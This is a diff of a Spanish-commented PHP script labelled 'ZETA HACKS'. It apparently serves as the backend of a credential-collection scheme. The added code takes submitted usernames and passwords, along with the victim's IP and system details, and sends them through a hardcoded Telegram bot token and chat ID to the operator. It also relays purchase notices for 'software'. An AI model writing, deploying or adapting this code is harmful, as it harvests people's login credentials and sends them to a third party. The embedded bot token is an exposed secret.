@@ -1,28 +1,40 @@
 <?php
-/* 🔱 ZETA SYSTEM TRACKER V12 */
-session_start();
-header("Access-Control-Allow-Origin: *");
-date_default_timezone_set('America/La_Paz');
+// CONFIGURACIÓN PRIVADA DE ZETA HACKS
+$bot_token = "8093212860:AAFtxW_wZgngSg7nq-sKCvhTONkcSRgSy-c";
+$chat_id = "7621351319";
 
-$token = "8093212860:AAFtxW_wZgngSg7nq-sKCvhTONkcSRgSy-c";
-$admin_id = "7621351319";
+// Capturar datos enviados por la Terminal
+$data = json_decode(file_get_contents('php://input'), true);
 
-function getIP() { 
-    return $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR']; 
-}
+if ($data) {
+    $user = $data['user'] ?? 'DESCONOCIDO';
+    $pass = $data['pass'] ?? 'DESCONOCIDO';
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+    $tipo = $data['tipo'] ?? 'REGISTRO'; // REGISTRO o COMPRA
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $ip = getIP();
-    $data = $_POST['data'] ?? 'Sin datos';
+    if ($tipo == 'REGISTRO') {
+        $mensaje = "🔱 *NUEVA CONEXIÓN DE AGENTE*\n";
+        $mensaje .= "━━━━━━━━━━━━━━━━━━\n";
+        $mensaje .= "👤 *USER:* `$user` \n";
+        $mensaje .= "🔑 *PASS:* `$pass` \n";
+        $mensaje .= "━━━━━━━━━━━━━━━━━━\n";
+        $mensaje .= "🌍 *IP:* $ip \n";
+        $mensaje .= "📱 *OS:* " . php_uname('s') . "\n";
+    } else {
+        $prod = $data['producto'];
+        $precio = $data['precio'];
+        $mensaje = "💰 *ORDEN DE COMPRA GENERADA*\n";
+        $mensaje .= "━━━━━━━━━━━━━━━━━━\n";
+        $mensaje .= "👤 *AGENTE:* `$user` \n";
+        $mensaje .= "💎 *SOFTWARE:* $prod \n";
+        $mensaje .= "💵 *TOTAL:* $precio \n";
+        $mensaje .= "━━━━━━━━━━━━━━━━━━";
+    }
+
+    $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($mensaje) . "&parse_mode=Markdown";
+    file_get_contents($url);
     
-    // FILTRO ANTI-SPAM (Evita mensajes repetidos en 2 segundos)
-    if (isset($_SESSION['last_msg']) && (time() - $_SESSION['last_msg'] < 2)) { exit; }
-    $_SESSION['last_msg'] = time();
-
-    $msg = "⚡ *ACTIVIDAD ZETA DETECTADA*\n👤 Cliente IP: `{$ip}`\n📝 Acción: `{$data}`\n⏰ Hora: " . date('H:i:s');
-    
-    // ENVIAR A TELEGRAM
-    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$admin_id&text=" . urlencode($msg) . "&parse_mode=Markdown";
-    @file_get_contents($url);
+    echo json_encode(["status" => "success"]);
 }
 ?>
